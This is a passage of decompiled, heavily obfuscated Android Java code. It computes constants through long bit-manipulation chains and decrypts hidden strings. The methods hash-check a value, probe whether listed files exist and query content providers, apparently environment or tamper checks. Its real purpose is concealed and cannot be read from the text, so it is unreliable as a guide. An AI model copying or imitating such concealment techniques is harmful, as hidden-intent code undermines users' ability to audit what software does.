                long j23 = (((((((j19 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                long j24 = (((((((((j18 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j18 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j18 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j18 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + j23 + (j22 | (j21 + j20));
                long j25 = (j24 >>> 48) & 43690;
                long j26 = ((j25 >>> 2) | (j25 >>> 1)) & 858993459;
                long j27 = ((j26 >>> 2) | j26) & 252645135;
                long j28 = (j24 >>> 32) & 43690;
                long j29 = ((j28 >>> 2) | (j28 >>> 1)) & 858993459;
                long j30 = ((j29 >>> 2) | j29) & 252645135;
                long j31 = ((((j30 >>> 4) | j30) & 16711935) << 16) + ((((j27 >>> 4) | j27) & 16711935) << 24);
                long j32 = (j24 >>> 16) & 43690;
                long j33 = ((j32 >>> 2) | (j32 >>> 1)) & 858993459;
                long j34 = ((j33 >>> 2) | j33) & 252645135;
                long j35 = j24 & 43690;
                long j36 = ((j35 >>> 2) | (j35 >>> 1)) & 858993459;
                long j37 = ((j36 >>> 2) | j36) & 252645135;
                bArr2[(((int) ((((j37 >>> 4) | j37) & 16711935) | (((((j34 >>> 4) | j34) & 16711935) << 8) + j31))) + 1107296746) ^ (-79429121)] = 19;
                bArr2[1] = 68;
                bArr2[2] = 40;
                bArr2[3] = -121;
                bArr2[4] = 24;
                bArr2[5] = -50;
                bArr2[6] = -114;
                long j38 = -111553761;
                long j39 = j22 + (j21 | j20);
                long j40 = (((((((((j38 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j38 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j38 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j38 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j23 + j39 + 6148914691236517205L;
                long j41 = (j40 >>> 48) & 43690;
                long j42 = ((j41 >>> 2) | (j41 >>> 1)) & 858993459;
                long j43 = ((j42 >>> 2) | j42) & 252645135;
                long j44 = (j40 >>> 32) & 43690;
                long j45 = ((j44 >>> 2) | (j44 >>> 1)) & 858993459;
                long j46 = ((j45 >>> 2) | j45) & 252645135;
                long j47 = ((((j46 >>> 4) | j46) & 16711935) << 16) | ((((j43 >>> 4) | j43) & 16711935) << 24);
                long j48 = (j40 >>> 16) & 43690;
                long j49 = ((j48 >>> 2) | (j48 >>> 1)) & 858993459;
                long j50 = ((j49 >>> 2) | j49) & 252645135;
                long j51 = j40 & 43690;
                long j52 = ((j51 >>> 2) | (j51 >>> 1)) & 858993459;
                long j53 = ((j52 >>> 2) | j52) & 252645135;
                int i = (int) ((((j53 >>> 4) | j53) & 16711935) | (((((j50 >>> 4) | j50) & 16711935) << 8) + j47));
                long j54 = -2138518910;
                long j55 = i;
                long j56 = ((((((((j54 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j54 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j54 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j54 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j55 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j55 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j55 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j55 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
                long j57 = (j56 >>> 48) & 43690;
                long j58 = ((j57 >>> 2) | (j57 >>> 1)) & 858993459;
                long j59 = ((j58 >>> 2) | j58) & 252645135;
                long j60 = (j56 >>> 32) & 43690;
                long j61 = ((j60 >>> 2) | (j60 >>> 1)) & 858993459;
                long j62 = ((j61 >>> 2) | j61) & 252645135;
                long j63 = ((((j62 >>> 4) | j62) & 16711935) << 16) | ((((j59 >>> 4) | j59) & 16711935) << 24);
                long j64 = (j56 >>> 16) & 43690;
                long j65 = ((j64 >>> 2) | (j64 >>> 1)) & 858993459;
                long j66 = ((j65 >>> 2) | j65) & 252645135;
                long j67 = ((((j66 >>> 4) | j66) & 16711935) << 8) + j63;
                long j68 = j56 & 43690;
                long j69 = ((j68 >>> 2) | (j68 >>> 1)) & 858993459;
                long j70 = ((j69 >>> 2) | j69) & 252645135;
                bArr2[7] = (((int) ((((j70 >>> 4) | j70) & 16711935) + j67)) + 270804240) ^ 1867714612;
                bArr2[8] = 114;
                bArr2[9] = 8;
                bArr2[10] = -106;
                bArr2[11] = -65;
                bArr2[12] = -42;
                bArr2[13] = -76;
                bArr2[14] = -82;
                bArr2[15] = -56;
                bArr2[16] = -103;
                bArr2[17] = -28;
                bArr2[18] = -12;
                bArr2[19] = 38;
                bArr2[20] = -83;
                bArr2[21] = 49;
                bArr2[22] = 15;
                bArr2[23] = -93;
                bArr2[24] = -119;
                bArr2[25] = -21;
                bArr2[26] = -48;
                long j71 = 2099204;
                long j72 = 0;
                long j73 = ((((((((j72 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j72 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j72 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j72 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                long j74 = ((((((((j71 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j71 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j71 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j71 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + j73;
                long j75 = (j74 >>> 48) & 43690;
                long j76 = ((j75 >>> 2) | (j75 >>> 1)) & 858993459;
                long j77 = ((j76 >>> 2) | j76) & 252645135;
                long j78 = (j74 >>> 32) & 43690;
                long j79 = ((j78 >>> 2) | (j78 >>> 1)) & 858993459;
                long j80 = ((j79 >>> 2) | j79) & 252645135;
                long j81 = ((((j80 >>> 4) | j80) & 16711935) << 16) + ((((j77 >>> 4) | j77) & 16711935) << 24);
                long j82 = (j74 >>> 16) & 43690;
                long j83 = ((j82 >>> 2) | (j82 >>> 1)) & 858993459;
                long j84 = ((j83 >>> 2) | j83) & 252645135;
                long j85 = j74 & 43690;
                long j86 = ((j85 >>> 2) | (j85 >>> 1)) & 858993459;
                long j87 = ((j86 >>> 2) | j86) & 252645135;
                byte b4 = 399406447 ^ ((-402619900) + (((int) ((((j87 >>> 4) | j87) & 16711935) | (((((j84 >>> 4) | j84) & 16711935) << 8) | j81))) | 3213488));
                long j88 = (j23 | j39) + j73;
                long j89 = (j88 >>> 48) & 21845;
                long j90 = (j89 | (j89 >>> 1)) & 858993459;
                long j91 = (j90 | (j90 >>> 2)) & 252645135;
                long j92 = (j88 >>> 32) & 21845;
                long j93 = ((j92 >>> 1) | j92) & 858993459;
                long j94 = ((j93 >>> 2) | j93) & 252645135;
                long j95 = (((j91 | (j91 >>> 4)) & 16711935) << 24) | ((((j94 >>> 4) | j94) & 16711935) << 16);
                long j96 = (j88 >>> 16) & 21845;
                long j97 = ((j96 >>> 1) | j96) & 858993459;
                long j98 = ((j97 >>> 2) | j97) & 252645135;
                long j99 = ((((j98 >>> 4) | j98) & 16711935) << 8) + j95;
                long j100 = j88 & 21845;
                long j101 = (j100 | (j100 >>> 1)) & 858993459;
                long j102 = (j101 | (j101 >>> 2)) & 252645135;
                y(bArr2, new byte[]{89, 85, 48, b4, 73, -37, -41, -20, -17, -100, -65, -23, -92, 9, (((((int) (((j102 | (j102 >>> 4)) & 16711935) | j99)) | 1819121267) & (-1587509882)) + 336461904) ^ 1251048044, -65, -26, -31, 113, 104, -84, -122, 66, -28, -32, -120, -72});
                String intern = new String(bArr2, charset).intern();
                StringBuilder h3 = e0.a.h(str2);
                byte[] bArr3 = {-104};
                y(bArr3, new byte[]{-72, -32, 54, -3, -108, 17, 0, 125});
                h3.append(new String(bArr3, charset).intern());
                h3.append(str);
                t(intern, h3.toString());
                return true;
            }
        }
        return false;
    }

    public final boolean J(String str, String str2) {
        boolean z3;
        StringBuilder sb = new StringBuilder();
        byte[] bArr = {-106, 45, 82, -54, 68, 107, 107, -43};
        v(bArr, new byte[]{93, 126, -80, 92, -102, 55, -83, 23});
        Charset charset = StandardCharsets.UTF_8;
        sb.append(new String(bArr, charset).intern());
        sb.append(str);
        String d2 = E1.d(sb.toString());
        if (d2 != null && d2.equals(str2)) {
            z3 = true;
        } else {
            z3 = false;
        }
        if (z3) {
            byte[] bArr2 = new byte[V2.a(-1875670716, -579092491, 1296578225) ^ (-1296578216)];
            bArr2[0] = -117;
            bArr2[1] = 41;
            bArr2[2] = -59;
            long j2 = 1197064192;
            long j3 = -1;
            long j4 = (((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
            long j5 = (((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
            long j6 = (((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
            long j7 = (((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
            long j8 = ((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + (j7 | j6 | (j5 + j4));
            long j9 = (j8 >>> 48) & 43690;
            long j10 = ((j9 >>> 2) | (j9 >>> 1)) & 858993459;
            long j11 = ((j10 >>> 2) | j10) & 252645135;
            long j12 = (j8 >>> 32) & 43690;
            long j13 = ((j12 >>> 2) | (j12 >>> 1)) & 858993459;
            long j14 = ((j13 >>> 2) | j13) & 252645135;
            long j15 = ((((j14 >>> 4) | j14) & 16711935) << 16) | ((((j11 >>> 4) | j11) & 16711935) << 24);
            long j16 = (j8 >>> 16) & 43690;
            long j17 = ((j16 >>> 2) | (j16 >>> 1)) & 858993459;
            long j18 = ((j17 >>> 2) | j17) & 252645135;
            long j19 = j8 & 43690;
            long j20 = ((j19 >>> 2) | (j19 >>> 1)) & 858993459;
            long j21 = (j20 | (j20 >>> 2)) & 252645135;
            int i = (int) (((j21 | (j21 >>> 4)) & 16711935) | (((((j18 >>> 4) | j18) & 16711935) << 8) + j15));
            int i3 = (((-1610217468) | i) * 2) - (i ^ (-1610217468));
            long j22 = -413153273;
            long j23 = i3;
            long j24 = ((((((((j22 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j22 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j22 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j22 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + ((((((((j23 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j23 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j23 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j23 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
            long j25 = (j24 >>> 48) & 21845;
            long j26 = ((j25 >>> 1) | j25) & 858993459;
            long j27 = ((j26 >>> 2) | j26) & 252645135;
            long j28 = (j24 >>> 32) & 21845;
            long j29 = ((j28 >>> 1) | j28) & 858993459;
            long j30 = ((j29 >>> 2) | j29) & 252645135;
            long j31 = ((((j30 >>> 4) | j30) & 16711935) << 16) | ((((j27 >>> 4) | j27) & 16711935) << 24);
            long j32 = (j24 >>> 16) & 21845;
            long j33 = ((j32 >>> 1) | j32) & 858993459;
            long j34 = ((j33 >>> 2) | j33) & 252645135;
            long j35 = j24 & 21845;
            long j36 = (j35 | (j35 >>> 1)) & 858993459;
            long j37 = (j36 | (j36 >>> 2)) & 252645135;
            bArr2[(int) (((j37 | (j37 >>> 4)) & 16711935) | (((((j34 >>> 4) | j34) & 16711935) << 8) + j31))] = 8;
            bArr2[4] = 64;
            bArr2[5] = -108;
            bArr2[6] = 93;
            bArr2[7] = -82;
            bArr2[8] = 25;
            bArr2[9] = -9;
            bArr2[10] = -97;
            bArr2[11] = 52;
            bArr2[12] = -61;
            bArr2[13] = 112;
            bArr2[14] = -98;
            bArr2[15] = -105;
            bArr2[16] = -16;
            bArr2[17] = 73;
            bArr2[18] = 110;
            bArr2[19] = 81;
            bArr2[20] = -87;
            bArr2[21] = 94;
            bArr2[22] = -85;
            byte[] bArr3 = new byte[23];
            bArr3[0] = 70;
            bArr3[1] = 100;
            bArr3[2] = V2.a(1803833601, -7930070, -1811763671) ^ 1811763635;
            bArr3[3] = 18;
            bArr3[4] = -105;
            bArr3[5] = -11;
            bArr3[6] = -86;
            bArr3[7] = 125;
            bArr3[AbstractC0099x.a(1542230821, 2, -1542230822) ^ 1542230829] = -19;
            bArr3[9] = -106;
            bArr3[10] = 126;
            bArr3[11] = -25;
            bArr3[12] = 2;
            bArr3[13] = 44;
            bArr3[14] = 100;
            long j38 = 0;
            long j39 = (((((j38 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
            long j40 = (((((((j38 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
            long j41 = (((((((j38 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
            long j42 = (((((((j38 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
            long h2 = AbstractC0008a.h(j6, j5 | j4, j7, j42 | (j41 + (j40 | j39)));
            long j43 = (h2 >>> 48) & 21845;
            long j44 = ((j43 >>> 1) | j43) & 858993459;
            long j45 = ((j44 >>> 2) | j44) & 252645135;
            long j46 = (h2 >>> 32) & 21845;
            long j47 = ((j46 >>> 1) | j46) & 858993459;
            long j48 = ((j47 >>> 2) | j47) & 252645135;
            long j49 = ((((j48 >>> 4) | j48) & 16711935) << 16) + ((((j45 >>> 4) | j45) & 16711935) << 24);
            long j50 = (h2 >>> 16) & 21845;
            long j51 = ((j50 >>> 1) | j50) & 858993459;
            long j52 = ((j51 >>> 2) | j51) & 252645135;
            long j53 = h2 & 21845;
            long j54 = ((j53 >>> 1) | j53) & 858993459;
            long j55 = ((j54 >>> 2) | j54) & 252645135;
            long j56 = 402658304;
            long j57 = (((((((((j56 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j56 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j56 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j56 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j42 + (j41 | (j40 + j39)) + 6148914691236517205L;
            long j58 = (j57 >>> 48) & 43690;
            long j59 = ((j58 >>> 2) | (j58 >>> 1)) & 858993459;
            long j60 = (j59 | (j59 >>> 2)) & 252645135;
            long j61 = (j57 >>> 32) & 43690;
            long j62 = ((j61 >>> 2) | (j61 >>> 1)) & 858993459;
            long j63 = (j62 | (j62 >>> 2)) & 252645135;
            long j64 = (((j63 | (j63 >>> 4)) & 16711935) << 16) + (((j60 | (j60 >>> 4)) & 16711935) << 24);
            long j65 = (j57 >>> 16) & 43690;
            long j66 = ((j65 >>> 2) | (j65 >>> 1)) & 858993459;
            long j67 = (j66 | (j66 >>> 2)) & 252645135;
            long j68 = j57 & 43690;
            long j69 = ((j68 >>> 2) | (j68 >>> 1)) & 858993459;
            long j70 = (j69 | (j69 >>> 2)) & 252645135;
            bArr3[15] = (((((int) ((((j55 >>> 4) | j55) & 16711935) | (((((j52 >>> 4) | j52) & 16711935) << 8) | j49))) | (-1490380510)) & 1084835842) + ((int) (((j70 | (j70 >>> 4)) & 16711935) | ((((j67 | (j67 >>> 4)) & 16711935) << 8) | j64)))) ^ (-1487494271);
            bArr3[16] = -47;
            bArr3[17] = 70;
            bArr3[18] = -107;
            bArr3[19] = -46;
            bArr3[20] = -59;
            bArr3[21] = 10;
            bArr3[22] = -60;
            v(bArr2, bArr3);
            String intern = new String(bArr2, charset).intern();
            StringBuilder h3 = e0.a.h(str);
            byte[] bArr4 = {52, 125, 85};
            v(bArr4, new byte[]{20, 71, 117, 83, 24, -116, -2, 71});
            h3.append(new String(bArr4, charset).intern());
            h3.append(str2);
            t(intern, h3.toString());
            return z3;
        }
        return z3;
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x000c. Please report as an issue. */
    public final boolean K() {
        String[] strArr = new String[0];
        String str = null;
        char c4 = 2944;
        int i = 0;
        int i3 = 0;
        while (true) {
            switch (c4) {
                case 63106:
                    long j2 = 764422912;
                    long j3 = -1;
                    long j4 = (((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + ((((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
                    long j5 = (j4 >>> 48) & 43690;
                    long j6 = ((j5 >>> 2) | (j5 >>> 1)) & 858993459;
                    long j7 = ((j6 >>> 2) | j6) & 252645135;
                    long j8 = (j4 >>> 32) & 43690;
                    long j9 = ((j8 >>> 2) | (j8 >>> 1)) & 858993459;
                    long j10 = ((j9 >>> 2) | j9) & 252645135;
                    long j11 = ((((j10 >>> 4) | j10) & 16711935) << 16) | ((((j7 >>> 4) | j7) & 16711935) << 24);
                    long j12 = (j4 >>> 16) & 43690;
                    long j13 = ((j12 >>> 2) | (j12 >>> 1)) & 858993459;
                    long j14 = ((j13 >>> 2) | j13) & 252645135;
                    long j15 = j4 & 43690;
                    long j16 = ((j15 >>> 2) | (j15 >>> 1)) & 858993459;
                    long j17 = ((j16 >>> 2) | j16) & 252645135;
                    byte[] bArr = {-125, 30, 93, 18, -16, -75, 122, -65, -14, -54, 42, 47, 84, 62, (((int) ((((j17 >>> 4) | j17) & 16711935) | (((((j14 >>> 4) | j14) & 16711935) << 8) | j11))) - 2147401582) ^ (-1382978659)};
                    long j18 = 346311168;
                    long j19 = 0;
                    long b4 = c3.b((((((((j18 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j18 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j18 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j18 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), ((((((((j19 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j19 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j19 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j19 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), 6148914691236517205L);
                    long j20 = (b4 >>> 48) & 43690;
                    long j21 = ((j20 >>> 2) | (j20 >>> 1)) & 858993459;
                    long j22 = (j21 | (j21 >>> 2)) & 252645135;
                    long j23 = (b4 >>> 32) & 43690;
                    long j24 = ((j23 >>> 2) | (j23 >>> 1)) & 858993459;
                    long j25 = (j24 | (j24 >>> 2)) & 252645135;
                    long j26 = (((j22 | (j22 >>> 4)) & 16711935) << 24) | (((j25 | (j25 >>> 4)) & 16711935) << 16);
                    long j27 = (b4 >>> 16) & 43690;
                    long j28 = ((j27 >>> 2) | (j27 >>> 1)) & 858993459;
                    long j29 = (j28 | (j28 >>> 2)) & 252645135;
                    long j30 = b4 & 43690;
                    long j31 = ((j30 >>> 2) | (j30 >>> 1)) & 858993459;
                    long j32 = (j31 | (j31 >>> 2)) & 252645135;
                    int i4 = 1079116852 + ((int) (((j32 | (j32 >>> 4)) & 16711935) | ((((j29 | (j29 >>> 4)) & 16711935) << 8) + j26)));
                    x(bArr, new byte[]{-30, 108, 56, 84, -103, -39, 31, -52, -94, -72, (i4 | 1425428091) - (1425428091 & i4), 92, 49, 80, 123});
                    t(new String(bArr, StandardCharsets.UTF_8).intern(), str);
                    return true;
                case 2944:
                    strArr = V.f392c;
                    i3 = strArr.length;
                    i = 0;
                    c4 = 46217;
                case 4635:
                    str = strArr[i];
                    if (new File(str).exists()) {
                        c4 = 63106;
                    } else {
                        c4 = 37239;
                    }
                case 37239:
                    i++;
                    c4 = 46217;
                case 46217:
                    if (i < i3) {
                        c4 = 4635;
                    } else {
                        c4 = 31727;
                    }
                case 31727:
                    return false;
                default:
                    c4 = 63106;
            }
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:4:0x0051. Please report as an issue. */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r12v17 */
    /* JADX WARN: Type inference failed for: r12v18 */
    /* JADX WARN: Type inference failed for: r12v22 */
    public final boolean L(Context context) {
        ProviderInfo providerInfo;
        int i;
        ProviderInfo resolveContentProvider;
        ?? r12;
        ProviderInfo resolveContentProvider2;
        Charset charset;
        String intern;
        byte[] bArr;
        Object e4 = null;
        boolean z3 = false;
        ProviderInfo providerInfo2 = null;
        boolean z4 = false;
        while (true) {
            char c4 = 12303;
            while (true) {
                switch (c4) {
                    case 12303:
                        PackageManager packageManager = context.getPackageManager();
                        long j2 = 144988225;
                        providerInfo = providerInfo2;
                        long j3 = -1;
                        long j4 = (((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                        long j5 = (((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                        long j6 = j5 | j4;
                        long j7 = (((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                        long j8 = (((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                        long j9 = (((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (j8 | (j7 + j6));
                        long j10 = (j9 >>> 48) & 43690;
                        long j11 = ((j10 >>> 2) | (j10 >>> 1)) & 858993459;
                        long j12 = ((j11 >>> 2) | j11) & 252645135;
                        long j13 = (j9 >>> 32) & 43690;
                        long j14 = ((j13 >>> 2) | (j13 >>> 1)) & 858993459;
                        long j15 = ((j14 >>> 2) | j14) & 252645135;
                        long j16 = ((((j15 >>> 4) | j15) & 16711935) << 16) + ((((j12 >>> 4) | j12) & 16711935) << 24);
                        long j17 = (j9 >>> 16) & 43690;
                        long j18 = ((j17 >>> 2) | (j17 >>> 1)) & 858993459;
                        long j19 = ((j18 >>> 2) | j18) & 252645135;
                        long j20 = j9 & 43690;
                        long j21 = ((j20 >>> 2) | (j20 >>> 1)) & 858993459;
                        long j22 = ((j21 >>> 2) | j21) & 252645135;
                        byte b4 = (((int) ((((j22 >>> 4) | j22) & 16711935) + (((((j19 >>> 4) | j19) & 16711935) << 8) + j16))) + 268501162) ^ (-413489390);
                        long j23 = 50334608;
                        long j24 = z3 ? 1L : 0L;
                        long j25 = (((((j24 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                        long j26 = (((((((j24 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                        long j27 = j26 | j25;
                        long j28 = (((((((j24 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                        long j29 = (((((((j24 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                        long j30 = j29 | (j28 + j27);
                        long j31 = (((((((((j23 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j23 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j23 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j23 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j30;
                        long j32 = (j31 >>> 48) & 43690;
                        long j33 = ((j32 >>> 2) | (j32 >>> 1)) & 858993459;
                        long j34 = ((j33 >>> 2) | j33) & 252645135;
                        long j35 = (j31 >>> 32) & 43690;
                        long j36 = ((j35 >>> 2) | (j35 >>> 1)) & 858993459;
                        long j37 = ((j36 >>> 2) | j36) & 252645135;
                        long j38 = ((((j37 >>> 4) | j37) & 16711935) << 16) + ((((j34 >>> 4) | j34) & 16711935) << 24);
                        long j39 = (j31 >>> 16) & 43690;
                        long j40 = ((j39 >>> 2) | (j39 >>> 1)) & 858993459;
                        long j41 = ((j40 >>> 2) | j40) & 252645135;
                        long j42 = j31 & 43690;
                        long j43 = ((j42 >>> 2) | (j42 >>> 1)) & 858993459;
                        long j44 = ((j43 >>> 2) | j43) & 252645135;
                        int i3 = ~(((int) ((((j44 >>> 4) | j44) & 16711935) + (((((j41 >>> 4) | j41) & 16711935) << 8) | j38))) | 50338960);
                        try {
                            byte a2 = V2.a(144278271, i3, (-144278271) + i3) ^ (-194617296);
                            byte[] bArr2 = new byte[38];
                            bArr2[z3 ? 1 : 0] = b4;
                            bArr2[1] = a2;
                            bArr2[2] = -11;
                            bArr2[3] = -5;
                            bArr2[4] = -39;
                            bArr2[5] = 60;
                            bArr2[6] = 115;
                            bArr2[7] = -55;
                            bArr2[8] = -87;
                            bArr2[9] = 58;
                            bArr2[10] = -92;
                            bArr2[11] = 116;
                            bArr2[12] = 119;
                            bArr2[13] = -46;
                            bArr2[14] = -79;
                            bArr2[15] = -18;
                            bArr2[16] = 66;
                            bArr2[17] = -64;
                            bArr2[18] = 43;
